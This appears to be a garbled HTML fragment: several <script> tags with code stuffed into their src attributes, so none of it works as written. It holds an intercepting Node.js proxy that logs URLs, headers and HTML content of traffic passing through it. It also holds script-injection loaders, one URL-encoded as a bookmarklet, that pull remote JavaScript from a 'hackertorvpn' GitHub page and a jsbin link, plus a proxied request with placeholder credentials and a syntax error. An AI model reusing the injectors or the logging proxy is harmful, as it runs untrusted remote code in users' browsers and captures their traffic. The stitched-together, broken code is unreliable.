<script src="var sys = require('sys'),
http = require('http');

var listen_port = 8000;

http.createServer(function (request, response) {
    //sys.log(request.connection.remoteAddress + ": " + request.method + " " + request.url);
    var proxy = http.createClient(80, request.headers['host'])
    var proxy_request = proxy.request(request.method, request.url, request.headers);
    proxy_request.addListener('response', function (proxy_response) {
        sys.log('##########################');
        sys.log(request.url);
        sys.log(JSON.stringify(proxy_response.headers));
        sys.log('##########################');
        proxy_response.addListener('data', function(chunk) {
            sys.log('##########################');
            sys.log(request.url);
            sys.log('Data');
            if (proxy_response.headers['content-type'].indexOf('text/html') >= 0) {
                sys.puts(chunk);
            }
            sys.log('##########################');
            response.write(chunk);
        });
        proxy_response.addListener('end', function() {
            sys.log('##########################');
            sys.log(request.url);
            sys.log('End');
            response.end();
        });
        response.writeHead(proxy_response.statusCode, proxy_response.headers);
    });
    request.addListener('data', function(chunk) {
        proxy_request.write(chunk);
    });
    request.addListener('end', function() {
        proxy_request.end();
    });
}).listen(listen_port);
sys.puts('Starting server on: ' + listen_port);">

<script src="(function() {
    var d = document,
        s = d.createElement('script'),
        t = d.body || d.getElementsByTagName('head')[0] || d.documentElement;
    s.src = "http://hackertorvpn.github.io/pt44";
    t.appendChild(s);
})();">
<script src="javascript:(function(){%28function%28%29%20%7Bvar%20d%20%3D%20document%2Cs%20%3D%20d.createElement%28%27script%27%29%2Ct%20%3D%20d.body%20%7C%7C%20d.getElementsByTagName%28%27head%27%29%5B0%5D%20%7C%7C%20d.documentElement%3Bs.src%20%3D%20%22http%3A//jsbin.com/ajubo4%22%3Bt.appendChild%28s%29%3B%7D%29%28%29%3B})();">
<script src="http://localhost:1337/vorlon.max.js"></script>
<script src="var request = require('request');

var url = 'http://hackertorvpn.github.io/pt44';
var proxy = 'http://username:password@usa.proxyservice.com:44';

request.get({ url: http://hackertorvpn.github.io/pt44, proxy: 44 }, function(err, res, body) {

});">
